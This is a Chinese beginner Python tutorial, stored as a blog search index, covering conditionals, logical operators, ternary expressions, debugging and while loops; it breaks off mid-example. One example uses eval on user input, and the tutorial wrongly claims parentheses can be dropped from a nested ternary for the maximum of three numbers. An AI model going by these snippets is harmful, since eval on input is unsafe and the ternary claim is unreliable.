<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>循环与判断</title>
      <link href="/2025/06/23/%E5%88%A4%E6%96%AD%E5%BE%AA%E7%8E%AF/"/>
      <url>/2025/06/23/%E5%88%A4%E6%96%AD%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h1><h4 id="1-顺序结构"><a href="#1-顺序结构" class="headerlink" title="1.顺序结构"></a>1.顺序结构</h4><h4 id="2-if-单分支"><a href="#2-if-单分支" class="headerlink" title="2.if-单分支"></a>2.if-单分支</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 单分支格式如下:</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> 判断条件:</span><br><span class="line">    语句体</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    语句体</span><br><span class="line">    </span><br><span class="line">执行流程:</span><br><span class="line"><span class="number">1.</span> 先执行判断条件, 看其是否成立.</span><br><span class="line"><span class="number">2.</span> 如果判断条件成立, 则执行 对应的语句体, 然后<span class="keyword">if</span>语句执行结果.</span><br><span class="line"><span class="number">3.</span> 如果判断条件不成立, 则什么都不做.</span><br><span class="line"></span><br><span class="line">细节:</span><br><span class="line"><span class="number">1.</span> 有缩进的(默认是<span class="number">4</span>个空格)</span><br><span class="line"><span class="number">2.</span> <span class="keyword">if</span>语句只能控制它的语句体, 外界语句, <span class="keyword">if</span>是无法控制的.</span><br><span class="line"><span class="number">3.</span> 有:</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># age = eval(input(&#x27;请录入您的年龄: &#x27;))</span></span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请录入您的年龄: &#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;哥已成年, 可以上网了!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----- end -----&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="3-比较运算符和逻辑运算符"><a href="#3-比较运算符和逻辑运算符" class="headerlink" title="3.比较运算符和逻辑运算符"></a>3.比较运算符和逻辑运算符</h4><p><strong>比较运算符</strong></p><ul><li><p>概述:<br>就是用来做 比较操作的, 也称之为: 关系运算符.<br>无论比较表达式简单还是复杂, 其结果必定是: 布尔值, 要么True, 要么False.</p></li><li><p>分类:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;, =, &lt;, &lt;=, ==, !=</span><br></pre></td></tr></table></figure><p>细节：不要把 &#x3D;&#x3D; 写成 &#x3D;, 一个&#x3D;是赋值, 两个&#x3D;是比较.</p></li></ul><p><strong>逻辑运算符</strong></p><ul><li>概述:<br>它适用于多条件的判断, 即: 同时满足多个条件, 还是满足多个条件的任意1个条件, 还是取反等操作</li></ul><ul><li><p>分类:</p><ul><li><p>and     逻辑与, 并且的意思, 即: 有False则整体为False.</p></li><li><p>or        逻辑或, 或者的意思, 即: 有True则整体为True.</p></li><li><p>not     逻辑非, 取反的意思, 即: False -&gt; 取反后, True,  True -&gt; 取反后False</p></li></ul></li></ul><ul><li><p>细节:</p><ol><li>逻辑运算符主要操作的是 <strong>关系表达式</strong>, 但是它也可以<strong>操作数字</strong>, 例如: 10 and 5</li><li>逻辑运算符操作数字的小技巧: 你把0当做False, 非0当做True即可</li></ol></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 演示比较运算符.</span></span><br><span class="line">a, b = <span class="number">10</span>, <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a &gt; b)    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &gt;= b)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &lt; b)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a &lt;= b)   <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a == b)   <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a != b)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">5</span> &gt;= <span class="number">5</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例2: 演示 逻辑运算符.</span></span><br><span class="line"><span class="built_in">print</span>(a &gt; <span class="number">5</span> <span class="keyword">and</span> b &lt;= <span class="number">3</span>)     <span class="comment"># True and True =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 演示 and     逻辑与, 并且的意思, 即: 有False则整体为False.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">and</span> <span class="literal">True</span>)    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span>)   <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">and</span> <span class="literal">True</span>)   <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">and</span> <span class="literal">False</span>)  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 演示 or      逻辑或, 或者的意思, 即: 有True则整体为True.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">or</span> <span class="literal">True</span>)    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">or</span> <span class="literal">True</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">or</span> <span class="literal">False</span>)  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 演示 not     逻辑非, 取反的意思, 即: False -&gt; 取反后, True,  True -&gt; 取反后, False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="literal">True</span>)         <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="literal">False</span>)        <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="keyword">not</span> <span class="literal">False</span>)    <span class="comment"># False, 同一个值, 偶数次取反, 该数字值不变.</span></span><br></pre></td></tr></table></figure><p><strong>逻辑与操作数字结论(技巧)</strong>：有0则0(即: 有False则整体为False), 否则取<strong>最后1个(非0)数字</strong>.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">5</span>)   <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">and</span> <span class="number">3</span> <span class="keyword">and</span> <span class="number">5</span>)    <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span> <span class="keyword">and</span> <span class="number">3</span> <span class="keyword">and</span> <span class="number">5</span>)   <span class="comment"># 5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">0</span>)    <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p><strong>逻辑或操作数字结论(技巧):</strong> 有非0则非0(即: 有True则整体为True), 否则<strong>取第1个(非0)数字</strong>.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">or</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">0</span>)    <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span> <span class="keyword">or</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">5</span>)   <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">or</span> <span class="number">3</span> <span class="keyword">or</span> <span class="number">5</span>)    <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span> <span class="keyword">or</span> <span class="number">3</span> <span class="keyword">or</span> <span class="number">5</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><h4 id="4-if-双分支"><a href="#4-if-双分支" class="headerlink" title="4.if-双分支"></a>4.if-双分支</h4><p><strong>格式:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件:</span><br><span class="line">语句体<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">语句体<span class="number">2</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年龄：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你已成年。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你未成年。&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="5-if-多分支"><a href="#5-if-多分支" class="headerlink" title="5.if-多分支"></a>5.if-多分支</h4><pre><code>if 条件1:语句体1elif 条件2:语句体2elif 条件3:语句体3......else:语句体n</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求: 根据考试成立, 发放奖励.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       成绩               奖励</span></span><br><span class="line"><span class="string">    90 ~ 100        奖励: 游乐场套票一张</span></span><br><span class="line"><span class="string">    80 ~ 89         奖励: 游乐场半天游</span></span><br><span class="line"><span class="string">    70 ~ 79         奖励: 博物馆全天游</span></span><br><span class="line"><span class="string">    60 ~ 69         奖励: 全套练习题</span></span><br><span class="line"><span class="string">    0 ~ 59          奖励: 口头激励</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 提示用户录入他/她的考试成绩, 并接收, 记得转成: 整数.</span></span><br><span class="line">score = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;请录入您的考试成绩: &#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 根据考试成立发放奖励.</span></span><br><span class="line"><span class="comment"># 写法1: 普通版.</span></span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span> <span class="keyword">and</span> score &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场套票一张&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">80</span> <span class="keyword">and</span> score &lt; <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场半天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">70</span> <span class="keyword">and</span> score &lt; <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 博物馆全天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">60</span> <span class="keyword">and</span> score &lt; <span class="number">70</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 全套练习题&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 口头激励&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法2: Python独有版.</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">90</span> &lt;= score &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场套票一张&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场半天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">70</span> &lt;= score &lt; <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 博物馆全天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &lt;= score &lt; <span class="number">70</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 全套练习题&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">00</span> &lt;= score &lt; <span class="number">60</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 口头激励&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;成绩无效, 男女混打 + 扫帚棒法!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法3: 实际开发版, 能看懂即可.</span></span><br><span class="line"><span class="keyword">if</span> score &lt; <span class="number">0</span> <span class="keyword">or</span> score &gt; <span class="number">100</span>:                <span class="comment"># 非法值校验</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;成绩无效, 男女混打 + 扫帚棒法!&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">90</span>:                       <span class="comment"># else的默认条件: score &gt;= 0 and score &lt;= 100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场套票一张&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">80</span>:                       <span class="comment"># else的默认条件: score &gt;= 0 and score &lt; 90</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 游乐场半天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">70</span>:                       <span class="comment"># else的默认条件: score &gt;= 0 and score &lt; 80</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 博物馆全天游&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">60</span>:                       <span class="comment"># else的默认条件: score &gt;= 0 and score &lt; 70</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 全套练习题&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:                                   <span class="comment"># else的默认条件: score &gt;= 0 and score &lt; 60</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;奖励: 口头激励&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-if-嵌套"><a href="#6-if-嵌套" class="headerlink" title="6.if-嵌套"></a>6.if-嵌套</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>：</span><br><span class="line">语句体<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">2</span>：</span><br><span class="line">语句体<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    语句体<span class="number">3</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    语句体<span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求: 坐公交车, 有座位可以坐下.</span></span><br><span class="line"><span class="comment"># 要求:  输入公交卡当前的余额, 只要够2元, 就可以上公交车. 如果车上有空座位, 就可以坐下.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">money = random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(money)</span><br><span class="line"><span class="keyword">if</span> money &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请上车&quot;</span>)</span><br><span class="line">    <span class="built_in">set</span> = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">set</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">set</span> &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;坐&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;站&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;滚&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="7-分支案例-猜拳游戏"><a href="#7-分支案例-猜拳游戏" class="headerlink" title="7.分支案例-猜拳游戏"></a>7.分支案例-猜拳游戏</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例: 猜拳游戏.</span></span><br><span class="line"><span class="comment"># 需求: 键盘录入玩家出的手势, 且和 电脑人的手势(随机生成), 进行比较, 打印结果.</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">player = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入您的手势编号, 规则: 石头(1), 剪刀(2), 布(3)  =&gt; &#x27;</span>))</span><br><span class="line"></span><br><span class="line">pc = random.randint(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (player == <span class="number">1</span> <span class="keyword">and</span> pc == <span class="number">2</span>) <span class="keyword">or</span> (player == <span class="number">2</span> <span class="keyword">and</span> pc == <span class="number">3</span>) <span class="keyword">or</span> (player==<span class="number">3</span> <span class="keyword">and</span> pc == <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;玩家 获得胜利&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> pc == player:</span><br><span class="line">    <span class="comment"># 情况2: 平局.</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;哎呀, 平局了!&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (player == <span class="number">1</span> <span class="keyword">and</span> pc == <span class="number">3</span>) <span class="keyword">or</span> (player == <span class="number">2</span> <span class="keyword">and</span> pc == <span class="number">1</span>) <span class="keyword">or</span> (player==<span class="number">3</span> <span class="keyword">and</span> pc == <span class="number">2</span>):</span><br><span class="line">    <span class="comment"># 情况3: 电脑人 胜利</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;电脑人 获得胜利!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;手势编号有误, 该轮无成绩!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="8-扩展-三元表达式"><a href="#8-扩展-三元表达式" class="headerlink" title="8.扩展-三元表达式"></a>8.扩展-三元表达式</h4><p><strong>概述</strong>：它是一种特殊写法, 可以用来优化 if.else 的操作.<br><strong>格式:</strong><br>        值1 if 判断条件 else 值2</p><p><strong>执行流程:</strong></p><ul><li>先执行判断条件, 看其结果是否成立.<br>   立就返回值1</li><li>不成立就返回值2</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求1: 获取两个整数的最大值.</span></span><br><span class="line">a, b = <span class="number">10</span>, <span class="number">31</span></span><br><span class="line"><span class="comment"># 三元表达式.</span></span><br><span class="line">max2 = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;最大值为: <span class="subst">&#123;max2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展: 三元表达式嵌套.</span></span><br><span class="line"><span class="comment"># 需求: 求3个整数的最大值.</span></span><br><span class="line">c, d, e = <span class="number">10</span>, <span class="number">20</span>, <span class="number">15</span></span><br><span class="line"><span class="comment"># 用三元搞定.</span></span><br><span class="line"><span class="comment"># max2 = c大 if c &gt;= d else d大</span></span><br><span class="line">   <span class="comment">#首先</span></span><br><span class="line"><span class="comment">#          比较 C 和 E          比较 C 和 D       比较 D 和 E</span></span><br><span class="line"><span class="comment"># max2 = (c if c &gt;= e else e) if c &gt;= d else (d if d &gt;= e else e)      # 小括号可以省略.</span></span><br><span class="line">max2 = c <span class="keyword">if</span> c &gt;= e <span class="keyword">else</span> e <span class="keyword">if</span> c &gt;= d <span class="keyword">else</span> d <span class="keyword">if</span> d &gt;= e <span class="keyword">else</span> e      <span class="comment"># 小括号可以省略.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;最大值为: <span class="subst">&#123;max2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="9-扩展-Debug断点调试"><a href="#9-扩展-Debug断点调试" class="headerlink" title="9.扩展-Debug断点调试"></a>9.扩展-Debug断点调试</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Debug断点调试:</span></span><br><span class="line"><span class="string">    概述:</span></span><br><span class="line"><span class="string">        它不仅可以帮助我们 排查程序的错误,  还可以辅助我们快速上手, 了解项目业务逻辑.</span></span><br><span class="line"><span class="string">    使用步骤:</span></span><br><span class="line"><span class="string">        1. 加断点.</span></span><br><span class="line"><span class="string">            原则: 哪里不会点哪里.</span></span><br><span class="line"><span class="string">        2. 启动调试.</span></span><br><span class="line"><span class="string">            右键 =&gt; Debug as ...</span></span><br><span class="line"><span class="string">        3. 看哪里.</span></span><br><span class="line"><span class="string">            下左: MainThread,  可以查看程序当前执行到哪里了.</span></span><br><span class="line"><span class="string">            下中: Variables,  可以查看变量的变化过程.</span></span><br><span class="line"><span class="string">            下右: Console,    可以查看程序的执行结果.</span></span><br><span class="line"><span class="string">        4. 如何进行下一步调试.</span></span><br><span class="line"><span class="string">            F7: 逐过程调试, 即: 遇到我们自己写的函数, 会跳转到函数内部.</span></span><br><span class="line"><span class="string">            F8: 逐行调试, 即: 即使遇到我们自己写的函数, 也只是当做一行代码来处理, 不会进入到函数内部...</span></span><br><span class="line"><span class="string">            F9: 逐断点调试, 即: 直接跳转到下一个断点. 如果当前断点已经是最后1个断点, 再次按下F9, 会一次性执行完后续所有的代码.</span></span><br><span class="line"><span class="string">        5. 如何结束调试.</span></span><br><span class="line"><span class="string">            场景1: 调试完.</span></span><br><span class="line"><span class="string">            场景2: 手动终止.</span></span><br><span class="line"><span class="string">            场景3: 最后1个断点的情况, 直接按F9</span></span><br><span class="line"><span class="string">        6. 如何删除断点.</span></span><br><span class="line"><span class="string">            场景1: 再次点击即可.</span></span><br><span class="line"><span class="string">            场景2: 点击 break points 图表, 移除断点.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 需求: 求3个整数的最大值.</span></span><br><span class="line"><span class="comment"># c, d, e = 10, 20, 15</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">10</span></span><br><span class="line">d = <span class="number">20</span></span><br><span class="line">e = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景1: if.else实现</span></span><br><span class="line"><span class="keyword">if</span> c &gt;= d:</span><br><span class="line">    <span class="comment"># c大, 比较 c 和 e</span></span><br><span class="line">    <span class="keyword">if</span> c &gt;= e:</span><br><span class="line">        <span class="built_in">max</span> = c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">max</span> = e</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># d大, 比较 d 和 e</span></span><br><span class="line">    <span class="keyword">if</span> d &gt;= e:</span><br><span class="line">        <span class="built_in">max</span> = d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">max</span> = e</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;最大值为: <span class="subst">&#123;<span class="built_in">max</span>&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello 1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello 2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello 3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello 4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello 5&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p><strong>格式:</strong><br>初始化条件1<br>while 判断条件2:<br>循环体3<br>控制条件4</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求: 打印 5次 HellWorld.</span></span><br><span class="line">i = <span class="number">1</span>                                           <span class="comment"># 初始化条件, 表示循环从</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:       <span class="comment"># i的值: 1, 2, 3, 4, 5       # 判断条件, 成立则循环继</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Hello World! <span class="subst">&#123;i&#125;</span>&#x27;</span>)                  <span class="comment"># 循环体, 表示判断条件满足的情况下, 重复的做某些事儿.</span></span><br><span class="line">    i += <span class="number">1</span>                                      <span class="comment"># 控制条件, 控制变量(初始化条件)变化的.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-while循环-求和思想"><a href="#1-while循环-求和思想" class="headerlink" title="1.while循环-求和思想"></a>1.while循环-求和思想</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求1: while循环 计算 1 ~ 100之间的数字和.  5050</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需求2: while循环 计算 1 ~ 100之间的偶数和.  2550        奇数和: 2500</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment">#偶数对二取余==0，奇数为1</span></span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><h4 id="2-while循环-统计思想"><a href="#2-while循环-统计思想" class="headerlink" title="2.while循环-统计思想"></a>2.while循环-统计思想</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">关于循环, 另一种比较重要的就是 统计思想了, 例如: 统计水仙花数的个数.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">需求1: 打印所有的水仙花数.</span></span><br><span class="line"><span class="string">需求2: 统计水仙花数的个数.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">水仙花数解释:</span></span><br><span class="line"><span class="string">    1. 它是1个三位数.</span></span><br><span class="line"><span class="string">    2. 它的各个位数的立方和相加 = 它本身.</span></span><br><span class="line"><span class="string">    3. 例如: 153 = 1*1*1 + 5*5*5 + 3*3*3 = 153, 所以 153就是水仙花数.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">100</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;=<span class="number">999</span>:</span><br><span class="line">    </span><br><span class="line">    gewei = i % <span class="number">10</span>    <span class="comment"># 获取该数字的各个位数 数字.</span></span><br><span class="line">    shiwei = i // <span class="number">10</span> % <span class="number">10</span></span><br><span class="line">    baiwei = i // <span class="number">100</span> % <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> gewei ** <span class="number">3</span> + shiwei ** <span class="number">3</span> + baiwei ** <span class="number">3</span> == i:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure><h4 id="3-循环嵌套-打印矩形"><a href="#3-循环嵌套-打印矩形" class="headerlink" title="3.循环嵌套-打印矩形"></a>3.循环嵌套-打印矩形</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = 